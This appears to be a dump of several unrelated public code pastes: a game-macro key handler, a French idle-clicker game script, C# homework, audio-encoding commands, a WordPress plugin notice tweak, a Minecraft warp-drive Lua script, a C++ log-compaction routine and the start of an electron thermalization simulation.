                with ActionInProgress():
                    base_seaf_art()
        # Third Row ###################################################
            elif event.key_number == 14:
                with ActionInProgress():
                    base_renforce()
            elif event.key_number == 15:
                with ActionInProgress():
                    eagle_airstrike()
            elif event.key_number == 16:
                with ActionInProgress():
                    eagle_five_hundred_kg()
            elif event.key_number == 17:
                with ActionInProgress():    
                    eagle_cluster()
            elif event.key_number == 18:
                with ActionInProgress():
                    orb_napalm_barrage()
            elif event.key_number == 19:    
                with ActionInProgress():
                    orb_laser()
            elif event.key_number == 20:
                with ActionInProgress():
                    orb_railcannon_strike()
        # else:
        #     print(""Key released:"", event.key_number)

# 
"
RZWNAvnZ,Untitled,Foufou10,CSS,Monday 24th of March 2025 04:24:08 PM CDT,"Let's make a game!
    name:Lemon Clicker
    by:Coyote
    desc: Projet shitpost pour Dusk, bisous sur toi <3
    created:24/03/2025
    updated:24/03/2025
    version:Indev-1
Settings
	background:https://i.imgur.com/hxLtTQG.png
	building cost increase:130%
	building cost refund:0%
	spritesheet:icons, 48 by 48, https://imgur.com/dkvbvwa.png
	stylesheet:https://pastebin.com/raw/hdqKf9wP
Layout
	use default
Buttons
	*kebabButton
		name:Ramasser un citron
		desc:Un magnifique citron est dans l'herbe. Prenez le !
		on click:anim icon wobble
		on click:yield 1 kebab
        on click:if (have television and chance(0.4%)) yield 1 trophy
		icon:https://imgur.com/DoXjqNP.png
		no text
		class:bigButton hasFlares
		icon class:shadowed
		tooltip origin:bottom
		tooltip class:red
		
Resources
	*kebab|kebabs
		name:Citron|Citrons
		desc:Vos kebabs. Viande composée de 17 animaux différents. Votre but est d'en avoir le plus.
		icon:https://i.imgur.com/DiSvTG3.png
		class:noBackground
		show earned
    *trophy|trophies
        name:Titre Meilleur Kebab|Titres Meilleur Kebab
		desc:Titre du meilleur kebab du mois. Précieux à votre notoriété et rare à récupéré.
		icon:https://imgur.com/2oxzUKi.png
		class:noBackground
		show earned
    *client|clients
        name:Client|Clients
		desc:Vos clients, la base de tout votre gagne-pain. On dit merci qui ?
		icon:https://i.imgur.com/8j7t4Ac.png
		class:noBackground
		show earned
Shinies
	*critiqueGastro
		on click:log Woop
		movement:onRight moveLeft fade bounce:0.05
		frequency:60
		frequency variation:30
		icon:https://imgur.com/AVUd3jF.png
		class:bigButton
		on click:
			$boost=1
			if (chance(25%))
				//get at least 7, or between 1 and 3 minutes of our kebab production
				$amount=max(7,random(kebabs:ps*60*1,kebabs:ps*60*3))*$boost
				toast J-P C vous achète<//><b>[$amount] kebabs</b>.
				yield $amount kebabs
			else
				$amount=1*$boost
				toast Jean Pierre Coffe vous récompense de <//><b>[$amount] titres meilleurs kebab[s?$amount]</b>!
				yield $amount trophy
			end
		end
    *clampinvisite
		on click:log Woop
		movement:anywhere moveRandom:6 fade bounce:0.1
		frequency:180
		frequency variation:60
		icon:https://i.imgur.com/kzS0JfF.png
		class:bigButton
		on click:
			$boost=1
			if (chance(65%))
				//get at least 7, or between 1 and 3 minutes of our kebab production
				$amount=max(10,random(kebabs:ps*60*1,kebabs:ps*60*6))*$boost
				toast Simon vous achète<//><b>[$amount] kebabs</b> et s'envole.
				yield $amount kebabs
			else if (chance(10%))
				$amount=3*$boost
				toast Simon se régale et vous donne <//><b>[$amount] titres meilleurs kebab[s?$amount]</b>!
				yield $amount trophy
            else
                $amount=max(10,random(clients:ps*60*1,clients:ps*60*6))*$boost
			    toast Simon vous offre <//><b>[$amount] clients</b> et s'envole.
				yield $amount clients
			end
		end
Buildings
	*TEMPLATE
		on click:anim glow
		
	*appakebab|appaskebab
		name:Appareil à Kebab|Appareils à Kebab
		desc:Appareil permettant de cuir le viande à kebab.<//><b>Effet:</b><.>Produit 2 kebabs toute les 10 secondes.
		icon:https://i.imgur.com/XVXEOxQ.png
		cost:20 kebabs
		on tick:yield 0.2 kebabs
		on tick:yield 0.1 clients
		unlocked
	*table|tables
		name:Table et chaises|Tables et chaises
		desc:Plus de tables, plus de clients, plus de kebab<//><b>Effet:</b><.>Produit 8 kebabs toute les 10 secondes.
		icon:https://i.imgur.com/krjWf32.png
		cost:100 kebabs
		on tick:yield 0.8 kebabs
		on tick:yield 0.4 clients
		req:100 kebabs:earned and 10 clients:earned
	
	*kebabier|kebabiers
		name:Kebabier|Kebabiers
		desc:Engager un nouveau chef kebabier.<//><b>Effet:</b><.>Produit 5 kebabs par seconde.
		icon:https://i.imgur.com/x5ITEfK.png
		cost:600 kebabs
		on tick:yield 5 kebabs
		on tick:yield 2.5 clients
		req:600 kebabs:earned and 500 clients:earned
	
	*cuisine|cuisines
		name:Cuisine|Cuisines
		desc:De nouvelles cuisines pour votre restau.<//><b>Effet:</b><.>Produit 12 kebabs par seconde.
		icon:https://i.imgur.com/VxpI8PF.png
		cost:4000 kebabs
		on tick:yield 12 kebabs
		on tick:yield 6 clients
		req:4000 kebabs:earned and 3000 clients:earned
	
	*restlocal|restslocal
		name:Restaurant local|Restaurants locaux
		desc: Racheter des bâtiments dans les environs et faites en des kebabs.<//><b>Effet:</b><.>Produit 90 kebabs par seconde.
		icon:https://i.imgur.com/7YPlmbQ.png
		cost:20000 kebabs
		on tick:yield 90 kebabs
		on tick:yield 30 clients
		req:20000 kebabs:earned and 10000 clients:earned
	
	*franchisel|franchisesl
		name:Restaurant franchisé|Restaurants franchisés
		desc:Engager des franchisés pour ouvrir d'autre kebab dans le pays<//><b>Effet:</b><.>Produit 300 kebabs par seconde.
		icon:https://i.imgur.com/c49IcSV.png
		cost:200000 kebabs, 1 trophy
		on tick:yield 300 kebabs
		on tick:yield 150 clients
		req:200000 kebabs:earned and 300000 clients:earned
		
	*franchisei|franchisesi
		name:Franchise internationale|Franchises internationale
		desc:Ouvrez vos kebabiers à l'international.<//><b>Effet:</b><.>Produit 1000 kebabs par seconde.
		icon:https://i.imgur.com/TvYPAKi.png
		cost:3000000 kebabs, 1 trophies
		on tick:yield 1000 kebabs
		on tick:yield 450 clients
		req:3000000 kebabs:earned and 3000000 clients:earned
		
	*usinekeb|usineskeb
		name:Usine à Kebabs|Usines à Kebab
		desc:Ouvrez des usines pour vendre vos kebabs en supermarché.<//><b>Effet:</b><.>Produit 4000 kebabs à la seconde.
		icon:https://i.imgur.com/tK9GyoZ.png
		cost:70000000 kebabs, 16 trophies
		on tick:yield 4000 kebabs
		on tick:yield 3000 clients
        on tick:if (have pagecritique) yield 0.01 trophy
		req:70000000 kebabs:earned and 30000000 clients:earned
		
	*thekairi
		name:Transcendance kébabière
		text:Transcendance kébabière ([this]%)
		desc:Rallier le véritable Dieu des kebabs à vos restaurants et demander 1/100 de sa puissance.<//><b>La transcendance est complète à [this]%.</b><//><b>Effet:</b><.>Produit 20.000 kebab toute les secondes.
		icon:https://i.imgur.com/5i80myE.png
		cost:300000000 kebabs, 100 trophies
		req:70000000 kebabs:earned and transartifact:earned
		limit:100
		cost increase:105%
        on tick:yield 5000 kebabs
Achievements
	*10clicks
  		name:Wowie! Ten whole clicks!
  		desc:You've clicked the big red button 10 times. Well done. Well done indeed.
  		req:10 kebabButton:clicks
Items
	*sword
  		name:A sword
  		desc:A very generic sword. +3 attack.
  		passive:grant 3 kebabs

Upgrades
	*TEMPLATE
		on click:anim glow
	
	//food upgrades
	//inspiration : http://rabbit.org/suggested-vegetables-and-fruits-for-a-rabbit-diet/
	
	*sauceketchup
		name:Sauce Ketchup
		desc:Un délice à la tomate à ajouter à votre carte.<//><b>Effet:</b><.>+1 kebab/click
		icon:https://i.imgur.com/jMWwIH5.png
		cost:100 kebabs
		passive:increase kebab yield of kebabButton by 1
		req:10 kebabs:earned
	*sauceblanche
		name:Sauce Blanche
		desc:Sauce classique des kebabs<//><b>Effet:</b><.>+1 kebab/click
		icon:https://i.imgur.com/dzul4Oo.png
		cost:200 kebabs
		passive:increase kebab yield of kebabButton by 1
		req:50 kebabs:earned
		
	*sauceharissa
		name:Sauce Harissa
		desc:Ca pique sa mère mais qu'est que c'est bon.<//><b>Effet:</b><.>+1 kebab/click
		icon:https://i.imgur.com/nYSYztS.png
		cost:400 kebabs
		passive:increase kebab yield of kebabButton by 1
		req:200 kebabs:earned
		
	*saucemayo
		name:Sauce Mayonnaise
		desc:La sauce préféré des gros américains.<//><b>Effet:</b><.>kebabs/click x2<.>Production kebab +5%
		icon:https://i.imgur.com/UTUaEGz.png
		cost:3000 kebabs
		passive:multiply kebab yield of kebabButton by 2
		passive:multiply yield of kebabs by 1.05
		req:1000 kebabs:earned
		
	*saucepoivre
		name:Sauce Poivre
		desc:Faites croire au gens que vous avez du budget <//><b>Effet:</b><.>kebabs/click x1.5<.>Production kebab +5%
		icon:https://i.imgur.com/WIgGtIx.png
		cost:10000 kebabs
		passive:multiply kebab yield of kebabButton by 1.5
		passive:multiply yield of kebabs by 1.05
		req:1000 kebabs:earned
		
	*sauceandalouse
		name:Sauce Andalouse
		desc:TOI TOI, MA BELLE ANDALOUSE.<//><b>Effet:</b><.>kebabs/click x1.5<.>Production kebab +5%
		icon:https://i.imgur.com/W5IHsBm.png
		cost:50000 kebabs
		passive:multiply kebab yield of kebabButton by 1.5
		passive:multiply yield of kebabs by 1.05
		req:10000 kebabs:earned
		
	*sancehannibal
		name:Sauce Hannibal
		desc:Sauce avec le nom d'un mec qui bouffait des gens.<//><b>Effet:</b><.>kebabs/click x1.5<.>Production kebab +5%
		icon:https://i.imgur.com/CzHmniw.png
		cost:100000 kebabs
		passive:multiply kebab yield of kebabButton by 1.5
		passive:multiply yield of kebabs by 1.05
		req:50000 kebabs:earned
		
	*saucealien
		name:Sauce Alien
		desc:On dit que c'est le sang de Dame Tu Cosita. En vrais on sait pas ce que c'est.<//><b>Effet:</b><.>kebabs/click x1.5<.>Production kebab +5%
		icon:https://i.imgur.com/yNB9nec.png
		cost:500000 kebabs
		passive:multiply kebab yield of kebabButton by 1.5
		passive:multiply yield of kebabs by 1.05
		req:100000 kebabs:earned
		
	*saucechipotle
		name:Sauce Chipotle
		desc:Meilleur sauce piquante du mooonde!<//><b>Effet:</b><.>kebabs/click x1.5<.>PProduction kebab +5%
		icon:https://i.imgur.com/XKzfET3.png
		cost:1000000 kebabs
		passive:multiply kebab yield of kebabButton by 1.5
		passive:multiply yield of kebabs by 1.05
		req:500000 kebabs:earned
		
	*saucevide
		name:Sauce V̴͔͎̼̻̼̺́̽̾̍͆̈́͊͐̅͆̀̕į̶̨̢͎̜̻̬̥̙̤̦̩̔͐͛͌͒̓͜͝ḑ̵̧̻̠͚͍͕͍̟͍̰̬̒̀̅̅̏̾̔̃͝͠ę̷̛̠̝̲͙̼̳͉̞̺͙͌̃̌́͆̇̽͗̅͝͠͝ͅ
		desc:Une sauce venue d'une autre dimension probablement..<//><b>Effet:</b><.>kebabs/click x2<.>Production kebab +10%
		icon:https://i.imgur.com/vudc4Rs.png
		cost:100000000 kebabs
		passive:multiply kebab yield of kebabButton by 2
		passive:multiply yield of kebabs by 1.4
		req:1000000 kebabs:earned
//building upgrade	
	*buildingUpgrade1
		name:Friteuse haute vitesse
		desc:Produisez de folles quantités de frites!<//><b>Effet:</b><.>appareils kebab x2<.>tables x2<.>kebabiers x2
		icon:https://i.imgur.com/jICQCjR.png
		cost:1000 kebabs
		passive:multiply yield of appakebab by 3
		passive:multiply yield of table by 3
		passive:multiply yield of kebabier by 3
		req:(appaskebab>=10 or tables>=10 or kebabiers>=10)
		
	*buildingUpgrade2
		name:Broche en titane
		desc:Les broches résistent à de plus grandes températures donc cuisson plus rapide. <//><b>Effet:</b><.>appareils kebab x2<.>tables x2<.>kebabiers x2
		icon:https://i.imgur.com/1KCoFNn.png
		cost:100000 kebabs
		passive:multiply yield of appakebab by 5
		passive:multiply yield of table by 5
		passive:multiply yield of kebabier by 5
		req:(appaskebab>=50 or tables>=50 or kebabiers>=50)
		
	*buildingUpgrade3
		name:Table ultra modernes
		desc:Nouvelles table modernes qui attire le coup d'oeil.<//><b>Effet:</b><.>appareils kebab x2<.>tables x2<.>kebabiers x2
		icon:https://i.imgur.com/5qswrNH.png
		cost:5000000 kebabs
		passive:multiply yield of appakebab by 7
		passive:multiply yield of table by 7
		passive:multiply yield of kebabier by 7
		req:(appaskebab>=100 or tables>=100 or kebabiers>=100)
		
	*buildingUpgrade4
		name:Alarmes incendie
		desc:Enfin en règle pour la brigade anti-fraude.<//><b>Effet:</b><.>cuisine x2<.>restaurants locaux x2
		icon:https://i.imgur.com/BBalBEc.png
		cost:50000 kebabs
		passive:multiply yield of cuisine by 2
		passive:multiply yield of restlocal by 2
		req:(cuisines>=10 or restslocal>=10)
		
	*buildingUpgrade5
		name:Aire de jeux
		desc:Ca attire les gosses donc les parents!<//><b>Effet:</b><.>cuisine x2<.>restaurants locaux x2
		icon:https://i.imgur.com/Kli5MIe.png
		cost:5000000 kebabs
		passive:multiply yield of cuisine by 3
		passive:multiply yield of restlocal by 3
		req:(cuisines>=50 or restslocal>=50)
		
	*buildingUpgrade6
		name:Télévision branchée H24
		desc:Télévisions branchés tout le temps sur des matchs de foot.<//><b>Effet:</b><.>toutes franchises x2
		icon:https://i.imgur.com/AvD8Ajn.png
		cost:1000000 kebabs
		passive:multiply yield of franchisel by 2
		passive:multiply yield of franchisei by 2
		req:(franchisesl>=10 or franchisesi>=10)
		
	*buildingUpgrade7
		name:Traduction du Menu
		desc:En 92 langues différentes incluant le zoulou!<//><b>Effet:</b><.>toutes franchises x2
		icon:https://i.imgur.com/XTbfPre.png
		cost:500000000 kebabs
		passive:multiply yield of franchisel by 4
		passive:multiply yield of franchisei by 4
		req:(franchisesl>=50 or franchisesi>=50)
		
	*buildingUpgrade8
		name:Engrenage surpuissant
		desc:Huile de friture dans les engrenages.<//><b>Effet:</b><.>usines x2
		icon:https://i.imgur.com/YAiYDK8.png
		cost:1000000000 kebabs
		passive:multiply yield of usinekeb by 2
		req:10 usinekeb
    *television
		name:Publicité de masse
		desc:Vous êtes passez à la télévision et plus de gens vous critique.<//><b>Effet:</b><.>1% de chance de gagner un titre en faisant des kebabs
		icon:https://i.imgur.com/89CKmgC.png
		cost:1 trophy
		req:1 trophy:earned and franchisei>=1
    *jpcresur
		name:Résurrection
		desc:Faites resortir Jean-Pierre Coffe de sa tombe !<//><b>Effet:</b><.>Jean Pierre Coffe apparaît plus souvent.
		icon:https://i.imgur.com/tjaPlq8.png
		passive:multiply frequency of critiqueGastro by 0.7
		cost:30 trophies
		req:5 trophy:earned and franchisei>=1
	*transartifact
		name:Artéfact de la Transcendance
		desc:Vous trouvez cet artéfact aléatoirement dans les caisses de broche à kebab. Peut être sera t'il d'utilité ?<//><b>Effet:</b><.>Transcendance disponible.
		icon:https://i.imgur.com/64gAcVH.png
		cost:100 trophies
		req:50 trophies:earned and usinekeb>=1
	*pagecritique
		name:Page Critique
		desc:La page critique sur le site de votre kebab est ouverte!<//><b>Effect:</b><.>Un titre meilleur kebab apparaît toutes les 100 secondes
		icon:https://i.imgur.com/Mb7fcFj.png
		cost:75 trophies
		req:75 trophies:earned and usinekeb>=1"
HBPj8CJn,HW 4_3_2,rukvir,C#,Monday 24th of March 2025 04:08:18 PM CDT,"using System;

namespace HomeWork
{
    class Program
    {

        static void Main(string[] args)
        {
            const string exit = ""exit"";
            const string totalSum = ""sum"";

            string inputUser = """";
            int[] numbers = new int[0];
            int sumNumbers = 0;
            bool isRunning = true;

            while (isRunning)
            {
                Console.WriteLine(""Введите число"");
                inputUser = Console.ReadLine();

                if (inputUser == exit)
                {
                    isRunning = false;
                }
                else if (inputUser == totalSum)
                {
                    sumNumbers = 0;

                    for (int i = 0; i < numbers.Length; i++)
                    {
                        sumNumbers += numbers[i];
                    }
                    Console.WriteLine($""Сумма массива = {sumNumbers} "");
                    Console.WriteLine(""-------------------"");
                }
                else if (int.TryParse(inputUser, out int number))
                {
                    int[] newNumbers = new int[numbers.Length + 1];

                    for (int i = 0; i < numbers.Length; i++)
                    {
                        newNumbers[i] = numbers[i];
                    }

                    newNumbers[newNumbers.Length - 1] = number;
                    numbers = newNumbers;
                }
                else
                {
                    Console.WriteLine(""Некоректный ввод! Введите целое число."");
                }

                if (numbers.Length == 0)
                {
                    Console.WriteLine(""\nМассив пустой."");
                }
                else
                {
                    Console.WriteLine(""\nИтоговый массив:"");

                    for (int i = 0; i < numbers.Length; i++)
                    {
                        Console.Write($""{numbers[i]} "");
                    }
                    Console.WriteLine(""\n"");
                }
            }

            Console.ReadKey();
        }
    }
}"
6M8mA3MA,qaac64 sample promts,Urik_Kane,Batch,Monday 24th of March 2025 04:07:03 PM CDT,"rem won't accept FLAC as input
rem won't read tags & artwork from WAV
rem without -d output folder will write file to current directory

qaac64 -V 100 --copy-artwork input -d outfolder


rem ALAC
rem -b 16 to force 16-bit depth in case input isn't

qaac64 -A -b 16 --copy-artwork input -d outfolder
"
AksJaDiL,Remove Elementor Acivation Notice,tommyosheawebdesign,PHP,Monday 24th of March 2025 03:43:04 PM CDT,"Install Elementor Free.

Download and install Pro Elements from https://proelements.org

File Location: /wp-content/plugins/pro-elements/license/admin.php



public function admin_license_details() {
    if ( ! current_user_can( 'manage_options' ) ) {
        return;
    }

    if ( $this->is_block_editor_page() ) {
        return;
    }

    $license_key = self::get_license_key();

    /**
     * @var Admin_Notices $admin_notices
     */
    $admin_notices = Plugin::elementor()->admin->get_component( 'admin-notices' );

    if ( empty( $license_key ) ) {
        // Disabled Elementor Pro license activation notice.
        return;
    }

    $license_data = API::get_license_data();

    if ( API::is_licence_pro_trial() ) {
        return;
    }

    $errors = self::get_errors_details();

    if ( ! $license_data['success'] && isset( $license_data['error'], $errors[ $license_data['error'] ] ) ) {
        $error_data = $errors[ $license_data['error'] ];

        $admin_notices->print_admin_notice( [
            'title' => $error_data['title'],
            'description' => $error_data['description'],
            'button' => [
                'text' => $error_data['button_text'],
                'url' => $error_data['button_url'],
                'type' => isset( $error_data['button_type'] ) ? $error_data['button_type'] : '',
            ],
        ] );

        return;
    }

    if ( API::is_license_active() && API::is_license_about_to_expire() ) {
        $renew_url = API::RENEW_URL;

        $title = sprintf(
            esc_html__( 'Your License Will Expire in %s.', 'elementor-pro' ),
            human_time_diff(
                current_time( 'timestamp' ),
                strtotime( $license_data['expires'] )
            )
        );

        if ( isset( $license_data['renewal_discount'] ) && 0 < $license_data['renewal_discount'] ) {
            $description = sprintf(
                esc_html__( 'Renew your license today, and get an exclusive, time-limited %s discount.', 'elementor-pro' ),
                $license_data['renewal_discount'] . '%'
            );
        } else {
            $description = esc_html__( 'Renew your license today, to keep getting feature updates, premium support, Pro widgets & unlimited access to the template library.', 'elementor-pro' );
        }

        $admin_notices->print_admin_notice( [
            'title' => $title,
            'description' => $description,
            'type' => 'warning',
            'button' => [
                'text' => esc_html__( 'Renew now', 'elementor-pro' ),
                'url' => $renew_url,
                'type' => 'warning',
            ],
        ] );
    }
}
"
QTDXxqLW,Dirk 自动驾驶,jaklsfjlsak,Lua,Monday 24th of March 2025 03:22:44 PM CDT,"```lua
local core = peripheral.find(""warpdriveShipCore"")
core.enable(true)
core.command(""IDLE"", false)
    
-- Make sure the temp file exists --
if fs.exists(""temp"") then
else
    fs.open(""temp"", ""w"")
    local h = fs.open(""temp"", ""w"")
    h.close()
end
------------------------------------

    local h = fs.open(""temp"", ""r"")
    if h.readAll() == ""t"" then 
        h.close()
        print(""Continually jumping..."")
        --local core = peripheral.find(""warpdriveShipCore"")
        
        --local h = fs.open(""temp"", ""r"")
        --if h.readAll() == ""t"" then 
            --h.close()
            core.enable(true)
            core.command(""IDLE"", false)
            sleep(1)
            core.command(""MANUAL"", true)
        --end
        
        print(""Press `space` to stop jumping"")
        
        local event, key = os.pullEvent(""key"")
        if key == keys.space then
            local h = fs.open(""temp"", ""w"")
            h.writeLine(""f"")
            h.close()
            print(""Movement stopped for next jump"")
        end

    else
    
    h.close()    

    print(""Please input forward movement: "")
    ForMove = tonumber(read())
    print(""Please input lateral movement: "")
    LatMove = tonumber(read())
    print(""Please input vertical movement: "")
    VerMove = tonumber(read())

    core.movement(ForMove, VerMove, LatMove)

    print(""Starting continual jumping"")
    print(""Press `Space` after a jump to stop jumping"")

    core.command(""MANUAL"", true)
    print(""Starting Auto-pilot"")

    local h = fs.open(""temp"", ""w"")
    h.write(""t"")
    h.close()

end
```"
0wPXH5Bu,Redka Compact Init,scottish_esquire,C++,Monday 24th of March 2025 02:45:31 PM CDT,"#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <map> // Используем std::map вместо unordered_map для автоматической сортировки
#include <filesystem>
#include <chrono>
#include <csignal>
#include <thread>
#include <zlib.h> // Для сжатия данных
 
namespace fs = std::filesystem;
 
// Конфигурационные параметры (можно вынести в отдельный файл)
// const size_t WAL_SIZE_THRESHOLD = 64 * 1024 * 1024; // 64MB

const size_t WAL_SIZE_THRESHOLD = 512; // Уменьшили для тестирования!!!!!!!!!!!!!!!!!!!!!!!!!!!

const std::string WAL_FILENAME = ""wal.log"";
const std::string SST_DIR = ""sst_files"";
const bool ENABLE_COMPRESSION = true;
 
#pragma pack(push, 1) // Выравнивание структур для бинарной записи
struct BrixHeader {
    uint32_t version = 1;    // Версия формата
    uint32_t entry_count;    // Количество записей
    uint64_t index_offset;   // Смещение индексного блока
    uint8_t flags = 0;       // Флаги (например, сжатие)
};
 
struct BrixIndexEntry {
    uint32_t key_length;     // Длина ключа
    uint64_t data_offset;    // Смещение данных
    uint32_t data_length;    // Длина данных
};
#pragma pack(pop)
 
struct WalEntry {
    std::string id;
    std::string data;
};
 
struct SstEntry {
    std::string id;
    std::string data;
 
    // Для сортировки
    bool operator<(const SstEntry& other) const {
        return id < other.id;
    }
};
 
// Глобальный флаг для graceful shutdown
volatile std::sig_atomic_t g_running = 1;
 
void signal_handler(int) {
    g_running = 0;
    std::cout << ""\nReceived shutdown signal, finishing current operation..."" << std::endl;
}
 
// Сжатие данных с помощью zlib
std::string compressData(const std::string& data) {
    uLongf compressed_size = compressBound(data.size());
    std::string compressed(compressed_size, '\0');
 
    if (compress2((Bytef*)compressed.data(), &compressed_size,
                 (const Bytef*)data.data(), data.size(),
                 Z_BEST_COMPRESSION) != Z_OK) {
        throw std::runtime_error(""Compression failed"");
    }
 
    compressed.resize(compressed_size);
    return compressed;
}
 
// Чтение WAL с обработкой ошибок
std::vector<WalEntry> readWalFile(const std::string& filename) {
    std::vector<WalEntry> entries;
 
    try {
        std::ifstream walFile(filename);
        if (!walFile) {
            throw std::runtime_error(""Cannot open WAL file"");
        }
 
        std::string line;
        while (g_running && std::getline(walFile, line)) {
            try {
                size_t at_pos = line.find('@');
                size_t space_pos = line.find(' ', at_pos);
 
                if (at_pos == std::string::npos || space_pos == std::string::npos) {
                    std::cerr << ""Skipping malformed WAL entry: "" << line << std::endl;
                    continue;
                }
 
                std::string id = line.substr(at_pos + 1, space_pos - at_pos - 1);
                entries.push_back({id, line});
            } catch (const std::exception& e) {
                std::cerr << ""Error parsing WAL entry: "" << e.what() << std::endl;
            }
        }
    } catch (const std::exception& e) {
        std::cerr << ""WAL read error: "" << e.what() << std::endl;
    }
 
    return entries;
}
 
// Запись в SST с индексом и поддержкой сжатия
void writeSstFile(const std::string& filename, const std::vector<SstEntry>& entries) {
    try {
        std::ofstream sstFile(filename, std::ios::binary);
        if (!sstFile) {
            throw std::runtime_error(""Cannot create SST file"");
        }
 
        // Заголовок (запишем реальные данные позже)
        BrixHeader header;
        header.entry_count = entries.size();
        sstFile.write(reinterpret_cast<char*>(&header), sizeof(header));
 
        // Индексные записи
        std::vector<BrixIndexEntry> index;
        index.reserve(entries.size());
 
        // Запись данных
        for (const auto& entry : entries) {
            BrixIndexEntry idx;
            idx.key_length = entry.id.size();
            idx.data_offset = sstFile.tellp(); // Текущая позиция
 
            std::string data = entry.data;
            if (ENABLE_COMPRESSION) {
                try {
                    data = compressData(entry.data);
                    header.flags |= 0x01; // Устанавливаем флаг сжатия
                } catch (...) {
                    // В случае ошибки сжатия используем оригинальные данные
                    std::cerr << ""Compression failed for entry "" << entry.id << "", using uncompressed"" << std::endl;
                }
            }
 
            idx.data_length = data.size();
 
            // Запись данных
            uint32_t data_len = data.size();
            sstFile.write(reinterpret_cast<char*>(&data_len), sizeof(data_len));
            sstFile.write(data.data(), data.size());
 
            index.push_back(idx);
        }
 
        // Запись индекса
        header.index_offset = sstFile.tellp();
        for (const auto& idx : index) {
            sstFile.write(reinterpret_cast<const char*>(&idx), sizeof(idx));
        }
 
        // Обновляем заголовок
        sstFile.seekp(0);
        sstFile.write(reinterpret_cast<char*>(&header), sizeof(header));
 
    } catch (const std::exception& e) {
        std::cerr << ""SST write error: "" << e.what() << std::endl;
        fs::remove(filename); // Удаляем частично записанный файл
        throw;
    }
}
 
void compactProcess() {
    std::signal(SIGINT, signal_handler);
    std::signal(SIGTERM, signal_handler);
 
    // Создаем директорию для SST
    if (!fs::exists(SST_DIR)) {
        fs::create_directory(SST_DIR);
    }
 
    while (g_running) {
        try {
            // Проверяем размер WAL
            if (!fs::exists(WAL_FILENAME) || 
                fs::file_size(WAL_FILENAME) < WAL_SIZE_THRESHOLD) {
                std::this_thread::sleep_for(std::chrono::seconds(5));
                continue;
            }
 
            // Читаем и обрабатываем WAL
            auto walEntries = readWalFile(WAL_FILENAME);
            if (walEntries.empty()) {
                continue;
            }
 
            // Собираем последние версии (автоматически сортируются по id)
            std::map<std::string, SstEntry> latestEntries;
            for (const auto& entry : walEntries) {
                latestEntries[entry.id] = {entry.id, entry.data};
            }
 
            // Генерируем имя файла
            auto timestamp = std::chrono::duration_cast<std::chrono::milliseconds>(
                std::chrono::system_clock::now().time_since_epoch()).count();
            std::string sstFilename = SST_DIR + ""/"" + std::to_string(timestamp) + "".sst"";
 
            // Подготавливаем данные для записи
            std::vector<SstEntry> entriesToWrite;
            entriesToWrite.reserve(latestEntries.size());
            for (const auto& [id, entry] : latestEntries) {
                entriesToWrite.push_back(entry);
            }
 
            // Записываем SST
            writeSstFile(sstFilename, entriesToWrite);
 
            // Очищаем WAL
            std::ofstream walFile(WAL_FILENAME, std::ios::trunc);
 
            std::cout << ""Compaction successful. Created: "" << sstFilename 
                      << "" ("" << entriesToWrite.size() << "" entries)"" << std::endl;
 
        } catch (const std::exception& e) {
            std::cerr << ""Compaction error: "" << e.what() << std::endl;
            std::this_thread::sleep_for(std::chrono::seconds(10)); // Чтобы не зациклиться на ошибках
        }
    }
}
 
int main() {
    try {
        compactProcess();
        return 0;
    } catch (const std::exception& e) {
        std::cerr << ""Fatal error: "" << e.what() << std::endl;
        return 1;
    }
}"
CDniYss1,Thermalization_2(structures),phystota,C++,Monday 24th of March 2025 02:35:39 PM CDT,"#include <iostream>
#include <random>
#include <fstream>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#define n_e 100000
#define V_0 30000.0     // max velocity using to generate random distribution ---- doesn't work -> produces skew distribution???
#define Emin 0.0
#define Emax 100.0
#define bin_width 0.5
#define m_e 9.1E-31 // electron mass in kg
#define k_b 1.38E-23 // Boltzmann constant
#define q 1.6E-19 // elementary charge    
#define N ( (int)((Emax-Emin)/bin_width) ) // add 1 to include E_max if needed?
#define P 0.005
#define steps 200

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided = false;

    //initialization function // void func(Type0& t) → means the function expects a reference to variable t of type0
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis) {
        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double sinTheta = dis(gen);
        double cosTheta = sqrt(1.0 - sinTheta*sinTheta); 
        
        energy = Emax*dis(gen);
        
        double speed = sqrt(2*energy*k_b/m_e);

        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;

    }

};

int main() {

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)

    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram

    clock_t start = clock();

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);

    std::random_device rd1;
    std::mt19937 gen1(rd1());
    std::uniform_int_distribution<int> pair(0, n_e-1);

    std::ofstream file0(""velocities.dat"");    
    if (!file0.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file1(""energies.dat"");    
    if (!file1.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    
    std::ofstream file2(""energies_final.dat"");    
    if (!file2.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file3(""histo_random.dat"");    
    if (!file3.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""histo_maxwell.dat"");    
    if (!file4.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file4 << std::fixed << std::setprecision(10);           


    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis);
    }

    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }

    // for (int i = 0; i < N; i++){
    //     std::cout << i << "" "" << histo_random.at(i) << ""\n""; // using vector.at allows to access elements with boundary checkings
    // }


    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){\
